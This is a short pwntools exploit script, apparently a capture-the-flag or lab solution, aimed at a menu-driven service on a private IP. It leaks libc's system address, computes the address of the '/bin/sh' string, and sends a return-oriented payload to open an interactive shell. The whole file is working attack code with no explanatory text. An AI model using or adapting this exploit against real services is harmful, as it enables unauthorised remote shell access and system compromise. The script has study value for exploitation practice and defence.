#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

libc = ELF('./libc.so.6')
offset_libc_system = libc.symbols[b'system']
offset_libc_binsh = 0x18cd57
# offset_rop_addr = 0x00021102
rop_addr = 0x00000f23

rhp = {'host': '192.168.33.12', 'port':1234}
conn = remote(rhp['host'], rhp['port'])

res = conn.recvuntil(':')
log.info(res)
res = conn.recvuntil(':')
log.info(res)

conn.sendline('2')
log.info('send 2')

res = conn.recvuntil(':')
log.info(res)

conn.sendline('system')
log.info('send system')

res = conn.recvline()
log.info(res)

system_addr = int(res[-19:-1], 16)
log.info(hex(system_addr))
libc_addr = system_addr - offset_libc_system
binsh_addr = libc_addr + offset_libc_binsh
# rop_addr = libc_addr + offset_rop_addr

res = conn.recvuntil(':')
log.info(res)

conn.sendline('3')
log.info('send 3')

res = conn.recvuntil(':')
log.info(res)

conn.sendline('32')
log.info('send 32')

payload = b'A' * 8
payload += p64(rop_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

conn.sendline(payload)
log.info('send payload')

conn.sendline(payload)
res = conn.recv()
log.info(res)

conn.interactive()
